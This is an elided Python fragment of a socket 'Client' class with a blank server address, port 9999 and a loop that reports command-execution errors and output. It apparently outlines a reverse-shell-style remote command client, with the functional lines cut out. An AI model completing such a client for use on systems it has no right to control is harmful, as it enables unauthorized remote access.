...
class Client(object):
    ...
    def __init__(self):
        self.serverHost = ''  # IP address of your computer
        self.serverPort = 9999  # Port you will be listening on and communicating on
        self.socket = None
        ...
        while True:
            ...
            if data == b'':
                ...
                try:
                    ...
                    output_str = "execution unsuccessful: %s\n" % str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Error in command output: %s' % str(e))
        self.socket.close()
        return
